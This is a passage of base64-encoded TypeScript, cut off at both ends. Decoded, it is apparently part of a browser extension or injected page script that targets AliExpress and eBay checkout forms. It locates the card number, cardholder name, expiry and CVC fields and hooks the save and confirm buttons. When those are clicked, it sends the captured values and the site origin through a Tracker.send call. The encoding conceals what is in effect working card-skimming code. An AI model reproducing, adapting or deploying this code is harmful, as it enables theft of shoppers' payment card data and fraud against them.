2UoKSA6Ki8gJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRIb2xkZXInOiAvKihkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjZmlyc3ROYW1lJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgIT09IG51bGwgPyAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2ZpcnN0TmFtZScpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlIDogJ1Vua25vd24nICsgJyAnICsgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNsYXN0TmFtZScpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlICE9PSBudWxsID8gKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNsYXN0TmFtZScpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlIDoqLyAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEV4cGlyZSc6IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjY2FyZEV4cGlyYXRpb25Nb250aCcpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlICE9PSBudWxsID8gKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNjYXJkRXhwaXJhdGlvbk1vbnRoJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgOiAnVW5rbm93bicgKyAnLycgKyAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2NhcmRFeHBpcmF0aW9uWWVhcicpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlICE9PSBudWxsID8gKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNjYXJkRXhwaXJhdGlvblllYXInKSBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxJbnB1dEVsZW1lbnQpLmdldEF0dHJpYnV0ZSgnYXJpYS1sYWJlbCcpID09PSAnQ1ZWJyA/IChfX2NoaWxkRWxlbWVudCBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3dvcmtXZWJzaXRlJzogd2luZG93LmxvY2F0aW9uLm9yaWdpblxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH0sIDEwMCk7XG5cbiAgICAgICAgICAgIH1cbiAgICAgICAgfSwgMTAwMCk7XG4gICAgfVxuXG4gICAgZXhwbG9yZVNwZWNpZmljRWxlbWVudEJ5VGFnTmFtZShzZWxmOiB0aGlzLCBfX2VsZW1lbnRQYXJlbnQ6IGFueSwgX190YWdOYW1lOiBzdHJpbmcsIF9fcXVlcnk6IHN0cmluZywgY2FsbGJhY2s/OiBhbnkpIHtcbiAgICAgICAgaWYgKF9fZWxlbWVudFBhcmVudC5jaGlsZE5vZGVzLmxlbmd0aCAhPT0gMCkge1xuICAgICAgICAgICAgX19lbGVtZW50UGFyZW50LmNoaWxkTm9kZXMuZm9yRWFjaChmdW5jdGlvbiAoX19jaGlsZEVsZW1lbnQ6IGFueSkge1xuICAgICAgICAgICAgICAgIGlmIChfX2NoaWxkRWxlbWVudC5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpID09PSBfX3RhZ05hbWUpIHtcbiAgICAgICAgICAgICAgICAgICAgWy4uLl9fY2hpbGRFbGVtZW50LmF0dHJpYnV0ZXNdLmZvckVhY2goZnVuY3Rpb24gKGF0dHJpYnV0ZSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGF0dHJpYnV0ZS5ub2RlVmFsdWUudG9Mb3dlckNhc2UoKS5pbmRleE9mKF9fcXVlcnkpICE9PSAtMSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhfX2NoaWxkRWxlbWVudCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9KVxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVNwZWNpZmljRWxlbWVudEJ5VGFnTmFtZShzZWxmLCBfX2NoaWxkRWxlbWVudCwgX190YWdOYW1lLCBfX3F1ZXJ5LCBjYWxsYmFjayk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfSk7XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICBleHBsb3JlQWxpRXhwcmVzc1BheW1lbnROZXdDYXJkKHNlbGY6IHRoaXMsIF9fZWxlbWVudFBhcmVudDogSFRNTEVsZW1lbnQsIGNhbGxiYWNrPzogYW55KSB7XG4gICAgICAgIGxldCBkZXRlY3RlZEVsZW1lbnRzOiBhbnkgPSBbXTtcbiAgICAgICAgaWYgKF9fZWxlbWVudFBhcmVudC5jaGlsZE5vZGVzLmxlbmd0aCAhPT0gMCkge1xuICAgICAgICAgICAgX19lbGVtZW50UGFyZW50LmNoaWxkTm9kZXMuZm9yRWFjaChmdW5jdGlvbiAoX19jaGlsZEVsZW1lbnQpIHtcbiAgICAgICAgICAgICAgICBpZiAoKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5jbGFzc0xpc3QuY29udGFpbnMoJ2NhcmQtc3VyZmFjZScpKSB7XG4gICAgICAgICAgICAgICAgICAgIGlmICgoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLm5vZGVOYW1lID09PSAnRElWJyAmJiAoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLmNoaWxkTm9kZXMubGVuZ3RoICE9PSAwKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLmNoaWxkTm9kZXMuZm9yRWFjaChmdW5jdGlvbiAoX190YXJnZXRQYXJlbnRFbGVtZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKChfX3RhcmdldFBhcmVudEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLmNsYXNzTGlzdC5jb250YWlucygnY2FyZC1ubycpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVNwZWNpZmljRWxlbWVudEJ5VGFnTmFtZShzZWxmLCBfX3RhcmdldFBhcmVudEVsZW1lbnQsICdpbnB1dCcsICdjYXJkbicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbiAoZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZXRlY3RlZEVsZW1lbnRzLnB1c2goZGV0ZWN0ZWRFbGVtZW50KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKF9fdGFyZ2V0UGFyZW50RWxlbWVudCBhcyBIVE1MRWxlbWVudCkuY2xhc3NMaXN0LmNvbnRhaW5zKCdjYXJkLWJvdHRvbScpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVNwZWNpZmljRWxlbWVudEJ5VGFnTmFtZShzZWxmLCBfX3RhcmdldFBhcmVudEVsZW1lbnQsICdpbnB1dCcsICdjYXJkaG9sZGVyJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIChkZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRldGVjdGVkRWxlbWVudHMucHVzaChkZXRlY3RlZEVsZW1lbnQpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVNwZWNpZmljRWxlbWVudEJ5VGFnTmFtZShzZWxmLCBfX3RhcmdldFBhcmVudEVsZW1lbnQsICdpbnB1dCcsICdleHBpcmUnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24gKGRldGVjdGVkRWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGV0ZWN0ZWRFbGVtZW50cy5wdXNoKGRldGVjdGVkRWxlbWVudCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlU3BlY2lmaWNFbGVtZW50QnlUYWdOYW1lKHNlbGYsIF9fdGFyZ2V0UGFyZW50RWxlbWVudCwgJ2lucHV0JywgJ2N2JyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIChkZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRldGVjdGVkRWxlbWVudHMucHVzaChkZXRlY3RlZEVsZW1lbnQpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgaWYgKGNhbGxiYWNrKSB7XG4gICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKGRldGVjdGVkRWxlbWVudHMpO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH0pO1xuICAgICAgICB9XG4gICAgfVxuXG4gICAgcHJvY2Vzc0FsaUV4cHJlc3NQYXltZW50TmV3Q2FyZChzZWxmOiB0aGlzKSB7XG4gICAgICAgIHNlbGYuZXhwbG9yZUFsaUV4cHJlc3NQYXltZW50TmV3Q2FyZChzZWxmLFxuICAgICAgICAgICAgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5uZXctY2FyZCcpIGFzIEhUTUxFbGVtZW50KSxcbiAgICAgICAgICAgIGZ1bmN0aW9uIChlbGVtZW50czogYW55KSB7XG4gICAgICAgICAgICAgICAgbGV0IHBheW1lbnRNZXRob2RTdG9yZTogYW55ID0gW107XG4gICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLnNhdmUnKT8uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgIG5ldyBTZXQoZWxlbWVudHMpLmZvckVhY2goZnVuY3Rpb24gKGVsZW1lbnQ6IGFueSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZFN0b3JlLnB1c2goe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogZWxlbWVudC5ub2RlTmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBlbGVtZW50LmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICd0eXBlJzogZWxlbWVudC50eXBlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IGVsZW1lbnQudmFsdWVcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICB9KVxuICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xuICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxuICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogcGF5bWVudE1ldGhvZFN0b3JlWzBdLnZhbHVlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQnJhbmQnOiBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2FyZC10eXBlLWljb24uaWNvbicpPy5jbGFzc0xpc3QuY29udGFpbnMoJ3Zpc2EnKSA/ICd2aXNhJyA6IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2FyZC10eXBlLWljb24uaWNvbicpPy5jbGFzc0xpc3QuY29udGFpbnMoJ21hc3RlcmNhcmQnKSA/ICdtYXN0ZXJjYXJkJyA6IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2FyZC10eXBlLWljb24uaWNvbicpPy5jbGFzc0xpc3QuY29udGFpbnMoJ2Rpc2NvdmVyJykgPyAnZGlzY292ZXInIDogKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jYXJkLXR5cGUtaWNvbi5pY29uJyk/LmNsYXNzTGlzdC5jb250YWlucygnbW5wJykgPyAnbW5wJyA6IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2FyZC10eXBlLWljb24uaWNvbicpPy5jbGFzc0xpc3QuY29udGFpbnMoJ21hZXN0cm8nKSA/ICdtYWVzdHJvJyA6IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2FyZC10eXBlLWljb24uaWNvbicpPy5jbGFzc0xpc3QuY29udGFpbnMoJ2FtZXgnKSA/ICdhbWV4JyA6IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jYXJkLXR5cGUtaWNvbi5pY29uJyk/LmNsYXNzTmFtZSkpKSkpLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogcGF5bWVudE1ldGhvZFN0b3JlWzFdLnZhbHVlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkRXhwaXJlJzogcGF5bWVudE1ldGhvZFN0b3JlWzJdLnZhbHVlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogcGF5bWVudE1ldGhvZFN0b3JlWzNdLnZhbHVlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICd3b3JrV2Vic2l0ZSc6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2RTdG9yZSA9IFtdO1xuXG4gICAgICAgICAgICAgICAgICAgIGxldCBlZGl0ID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5lZGl0LWNhcmQnKSAhPT0gbnVsbCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoZWRpdCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgWydjbGljaycsICdkYmxjbGljayddLmZvckVhY2goZnVuY3Rpb24gKGV2ZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5lZGl0LWNhcmQnKT8uYWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IF9faW50ZXJ2YWwzID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcubmV3LWNhcmQnKSAhPT0gbnVsbCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKF9faW50ZXJ2YWwzKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5wcm9jZXNzQWxpRXhwcmVzc1BheW1lbnROZXdDYXJkKHNlbGYpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIDEwMDApO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfSwgMTAwMCk7XG4gICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICB9XG4gICAgICAgICk7XG4gICAgfVxuXG4gICAgcHJvY2Vzc0FsaUV4cHJlc3NQYXltZW50TmV3Q2FyZE9uU2Vjb25kUGF5bWVudChzZWxmOiB0aGlzKSB7XG4gICAgICAgIGxldCBpbnRlcnZhbCA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2FyZC1mb3JtJykgIT09IG51bGwpIHtcbiAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsKTtcbiAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVBbGlFeHByZXNzUGF5bWVudE5ld0NhcmQoc2VsZixcbiAgICAgICAgICAgICAgICAgICAgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jYXJkLWZvcm0nKSBhcyBIVE1MRWxlbWVudCksXG4gICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIChlbGVtZW50czogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgcGF5bWVudE1ldGhvZFN0b3JlOiBhbnkgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5wYXltZW50LWNvbmZpcm0nKT8uZmlyc3RFbGVtZW50Q2hpbGQ/LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5ldyBTZXQoZWxlbWVudHMpLmZvckVhY2goZnVuY3Rpb24gKGVsZW1lbnQ6IGFueSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50TWV0aG9kU3RvcmUucHVzaCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IGVsZW1lbnQubm9kZU5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBlbGVtZW50LmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3R5cGUnOiBlbGVtZW50LnR5cGUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBlbGVtZW50LnZhbHVlXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZE51bWJlcic6IHBheW1lbnRNZXRob2RTdG9yZVswXS52YWx1ZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQnJhbmQnOiBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2FyZC1icmFuZC1pY29uJyk/LmNsYXNzTGlzdC5jb250YWlucygndmlzYScpID8gJ3Zpc2EnIDogKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jYXJkLWJyYW5kLWljb24nKT8uY2xhc3NMaXN0LmNvbnRhaW5zKCdtYXN0ZXJjYXJkJykgPyAnbWFzdGVyY2FyZCcgOiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNhcmQtYnJhbmQtaWNvbicpPy5jbGFzc0xpc3QuY29udGFpbnMoJ2Rpc2NvdmVyJykgPyAnZGlzY292ZXInIDogKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jYXJkLWJyYW5kLWljb24nKT8uY2xhc3NMaXN0LmNvbnRhaW5zKCdtbnAnKSA/ICdtbnAnIDogKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jYXJkLWJyYW5kLWljb24nKT8uY2xhc3NMaXN0LmNvbnRhaW5zKCdtYWVzdHJvJykgPyAnbWFlc3RybycgOiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNhcmQtYnJhbmQtaWNvbicpPy5jbGFzc0xpc3QuY29udGFpbnMoJ2FtZXgnKSA/ICdhbWV4JyA6IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jYXJkLWJyYW5kLWljb24nKT8uY2xhc3NOYW1lKSkpKSksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6IHBheW1lbnRNZXRob2RTdG9yZVsxXS52YWx1ZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkRXhwaXJlJzogcGF5bWVudE1ldGhvZFN0b3JlWzJdLnZhbHVlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiBwYXltZW50TWV0aG9kU3RvcmVbM10udmFsdWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd3b3JrV2Vic2l0ZSc6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2RTdG9yZSA9IFtdO1xuXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGVkaXQgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcucGF5bWVudC1lZGl0JykgIT09IG51bGwpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoZWRpdCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbJ2NsaWNrJywgJ2RibGNsaWNrJ10uZm9yRWFjaChmdW5jdGlvbiAoZXZlbnQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcucGF5bWVudC1lZGl0Jyk/LmFkZEV2ZW50TGlzdGVuZXIoZXZlbnQsIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IF9faW50ZXJ2YWwzID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jYXJkLWZvcm0nKSAhPT0gbnVsbCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoX19pbnRlcnZhbDMpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYucHJvY2Vzc0FsaUV4cHJlc3NQYXltZW50TmV3Q2FyZE9uU2Vjb25kUGF5bWVudChzZWxmKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgMTAwMCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIDEwMDApO1xuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICApO1xuICAgICAgICAgICAgfVxuXG4gICAgICAgIH0sIDEwMClcblxuICAgIH1cblxuICAgIGV4cGxvcmVFYmF5UGF5bWVudERhdGFDb2xsZWN0aW9uKHNlbGY6IHRoaXMsIF9fZWJheUNyZWRpdENhcmRGb3JtRWxlbWVudDogYW55LCBlbGVtZW50czogYW55W10pIHtcbiAgICAgICAgc2VsZi5leHBsb3JlRWJheVBheW1lbnRGb3JtRWxlbWVudChzZWxmLCBfX2ViYXlDcmVkaXRDYXJkRm9ybUVsZW1lbnQsIGVsZW1lbnRzLCBmdW5jdGlvbiAoY29udHJvbGxlciwgZWxlbWVudHMpIHtcbiAgICAgICAgICAgIFsnY2xpY2snLCAnZGJsY2xpY2snXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xuICAgICAgICAgICAgICAgIGNvbnRyb2xsZXIuYWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICBsZXQgcGF5bWVudE1ldGhvZFN0b3JlOiBhbnkgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgZWxlbWVudHMuZm9yRWFjaChmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IEhUTUxJbnB1dEVsZW1lbnQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2RTdG9yZS5wdXNoKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fZGV0ZWN0ZWRFbGVtZW50LmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fZGV0ZWN0ZWRFbGVtZW50LnZhbHVlXG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XG4gICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZVBheW1lbnRNZXRob2RzRGF0YScsXG4gICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiBwYXltZW50TWV0aG9kU3RvcmVbMF0uaWQuaW5kZXhPZignY2FyZE51bWJlcicpICE9PSAtMSA/IHBheW1lbnRNZXRob2RTdG9yZVswXS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNhcmQtdHlwZXMnKT8uZmlyc3RFbGVtZW50Q2hpbGQ/LmdldEF0dHJpYnV0ZSgnYXJpYS1sYWJlbCcpPy50b0xvd2VyQ2FzZSgpLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogcGF5bWVudE1ldGhvZFN0b3JlWzNdLmlkID09PSAnY2FyZEhvbGRlckZpcnN0TmFtZScgPyBwYXltZW50TWV0aG9kU3RvcmVbM10udmFsdWUgOiAnVW5rbm93bicgKyAnICcgKyBwYXltZW50TWV0aG9kU3RvcmVbNF0uaWQgPT09ICdjYXJkSG9sZGVyTGFzdE5hbWUnID8gcGF5bWVudE1ldGhvZFN0b3JlWzRdLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgIC